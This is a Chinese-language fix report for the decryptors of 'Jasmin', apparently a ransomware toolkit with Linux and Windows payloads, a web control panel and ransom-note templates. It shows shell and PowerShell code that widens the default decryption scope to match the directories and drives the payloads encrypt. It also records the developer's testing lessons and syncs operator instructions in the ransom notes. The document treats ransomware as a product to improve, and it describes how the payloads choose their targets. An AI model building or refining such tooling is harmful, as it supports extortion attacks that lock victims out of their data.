# 10 — 解密默认全量修复报告

**版本**：v2.5.0　**提交**：`ca662ba`
**背景**：用户要求「末尾加要解密的目录，不写则解当前目录 —— **帮我默认为解密全部加密的文件**」。

---

## 一、问题：默认行为与加密范围不匹配

三个解密器原来的默认行为是「**解密当前目录**」：

```sh
# jasmin_unlock.sh（改前）
if [ -n "$*" ]; then
    DIRS="$*"
else
    DIRS="$(pwd)"                                   # ← 只解当前目录
    echo "[*] 未指定目录，使用当前目录: $DIRS"
fi
```

```powershell
# jasmin_unlock.ps1（改前）
if (-not $Paths -or $Paths.Count -eq 0) {
    $Paths = @((Get-Location).Path)                 # ← 只解当前目录
}
```

这与**载荷的加密范围**完全不对应：

| | 加密时的范围 | 解密时的默认范围（改前） |
|---|---|---|
| Linux 载荷 | `roots=['/home','/root','/var','/opt','/tmp','/srv']` | `$(pwd)` |
| Windows 载荷 | `DriveInfo.GetDrives()`（**所有磁盘**） | `(Get-Location).Path` |

**后果**：在 `/tmp` 目录下执行解密，`/home`、`/var`、`/srv` 里的加密文件全部漏掉，而用户看到的是「完成: 0 个已解密, 0 个失败」—— 会误以为没有加密文件，或以为解密失败。

值得注意的是，**核心解密器 `jasmin_decrypt_openssl.sh` 本来就有正确的全量默认**：

```sh
DIRS="$*"
[ -n "$DIRS" ] || DIRS="/home /root /var /opt /tmp /srv"      # ← 早就有
```

是 `jasmin_unlock.sh` 硬塞了一个 `$(pwd)` 把它覆盖掉了。**包装器覆盖了底层能力的正确默认值** —— 这是本次缺陷的根源。

---

## 二、修复

### 2.1 `jasmin_decrypt_openssl.sh` —— 默认范围增强

```sh
DIRS="$*"
if [ -z "$DIRS" ]; then
    # 未指定目录 => 解密全部加密文件。
    # 基准与载荷加密范围一致（载荷 roots），再自动补上真实挂载点，
    # 覆盖 /mnt/data、/data 这类自定义挂载。
    DIRS="/home /root /var /opt /tmp /srv"
    if [ -r /proc/mounts ]; then
        EXTRA=$(awk '
            $2 ~ /^\// &&
            $2 !~ /^\/(proc|sys|dev|run|boot)(\/|$)/ &&
            $3 !~ /^(proc|sysfs|devtmpfs|devpts|tmpfs|overlay|squashfs|cgroup|cgroup2|...)$/ &&
            $2 != "/" { print $2 }
        ' /proc/mounts 2>/dev/null)
        for M in $EXTRA; do
            case " $DIRS " in *" $M "*) ;; *) DIRS="$DIRS $M" ;; esac
        done
    fi
    echo "[*] 未指定目录 — 解密全部加密文件，扫描范围: $DIRS"
fi
```

**扫描时排除容器层与伪文件系统**：

```sh
find "$D" \
    -path '/var/lib/docker' -prune -o \
    -path '/var/lib/containerd' -prune -o \
    -path '/proc' -prune -o -path '/sys' -prune -o -path '/dev' -prune -o \
    -path '/run' -prune -o -path '/boot' -prune -o \
    -type f -name '*.jasmin' -print 2>/dev/null > "$TD/list"
```

> 实测服务器 `/var` 有 **181,984** 个文件，其中绝大部分在 `overlay2` / `containerd` 快照层里。
> 这些既不是受害者数据，又会让全盘扫描慢几个数量级 —— 必须 prune。

### 2.2 `jasmin_unlock.sh` —— 未给目录则不传参

```sh
# 未指定 => 解密全部加密文件（下面不向解密器传目录，由它用全量默认范围）
if [ -n "$*" ]; then
    # 允许逗号分隔，统一转成空格分隔
    DIRS=$(printf '%s' "$*" | tr ',' ' ')
    echo "[*] 指定目录: $DIRS"
else
    DIRS=""
    echo "[*] 未指定目录 — 将解密全部加密文件（6 个默认根目录 + 真实挂载点）"
fi
...
if [ -n "$DIRS" ]; then
    sh "$TD/dec.sh" "$TD/priv.pem" $DIRS
else
    sh "$TD/dec.sh" "$TD/priv.pem"          # 不传目录 => 解密器扫描全量范围
fi
```

**关键设计**：包装器不再自作主张填默认值，而是**把决策权交还给底层解密器**。这样默认范围只有一处定义，不会再次漂移。

### 2.3 `jasmin_unlock.ps1` —— 所有磁盘 + 用户目录

```powershell
if (-not $Paths -or $Paths.Count -eq 0) {
    # 未指定 => 解密全部加密文件（与载荷一致：载荷遍历所有磁盘）
    $Paths = @()
    foreach ($d in [System.IO.DriveInfo]::GetDrives()) {
        if ($d.IsReady -and ($d.DriveType -eq 'Fixed' -or $d.DriveType -eq 'Removable')) {
            $Paths += $d.RootDirectory.FullName
        }
    }
    # 常用用户目录（载荷优先命中这里）
    $Paths += @(
        "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Videos", "$env:USERPROFILE\Music",
        "$env:USERPROFILE\OneDrive", "$env:PUBLIC"
    )
    $Paths = $Paths | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -Unique
    Write-Host "[*] 未指定 -Paths — 将解密全部加密文件，扫描范围:"
    foreach ($x in $Paths) { Write-Host "      $x" }
}
```

> 与载荷对齐：Windows 载荷用 `DriveInfo.GetDrives()` 遍历所有盘，解密侧同样遍历所有固定/可移动磁盘。

### 2.4 后台文案与勒索信指引同步

| 位置 | 改动 |
|---|---|
| `Web Panel/includes/decrypt_panel.html` | Windows/Linux/macOS 三段主命令去掉 `-Paths C:\path\to\decrypt` / `/path/to/decrypt`，注明「不写则解密全部加密文件」 |
| `Web Panel/dashboard.php` | 静态行 + JS 动态生成行（`td.innerHTML=...`）同步 |

| `Web Panel/templates/ransom_note.txt` / `.html` | 同步（死文件，保持一致） |

## 四、过程中踩的坑

### 4.1 第一次测试跑的是旧脚本（测试方法错误）

首轮测试输出 `[*] 未指定目录，使用当前目录: /` —— 明显是旧版文案。排查发现：

- 测试脚本里 `docker cp "Linux Encrypter/jasmin_unlock.sh" ...` 读的是**服务器仓库**的文件；
- 而我的改动**只在本机，尚未 push** → 服务器仓库还是旧版 → 测的是旧代码。

**教训**：**跨机测试前先确认被测文件已同步**。用文件大小做断言（旧 3780B / 新 4424B）比看行为更快。

### 4.2 第一次测试「碰巧通过」

旧版 `unlock.sh` 未给目录时传 `$(pwd)`，而我在 `/` 下执行 → `dec.sh` 收到 `/` → `find /` → 也扫到了沙箱。

**结果正确但路径错误** —— 如果测试时 cwd 不是 `/`，就会失败。**这种"碰巧通过"最危险**，它会掩盖真实缺陷。

### 4.3 `payloads/` 是共享卷，`docker cp` 一次两容器可见

```
docker-php-1: 4424 bytes, 含新标记=2
docker-php-2: 4424 bytes, 含新标记=2      ← cp 到 php-1，php-2 同步可见
```

但**正式部署仍需 `--build`**：`entrypoint-php.sh` 每次启动会从镜像内的 `/opt/jasmin-tools/` 覆盖 `payloads/` 卷。只 `docker cp` 的话，容器一重启就回退。

### 4.4 包装器不要覆盖底层的默认值

`dec.sh` 早就写对了默认范围，`unlock.sh` 却硬塞 `$(pwd)`。**默认值只能有一处定义** —— 包装器应当"未指定就不传"，而不是自己编一个。

## 五、影响

- **对操作者**：解密从「必须手填目录」变成「默认全量」，漏解风险消除。
- **对已有数据**：无影响。本次只调解密侧的目录发现逻辑，未触碰文件格式与加密算法。
- **性能**：全盘扫描在 18 万文件的服务器上 1 秒完成（prune 容器层后）。
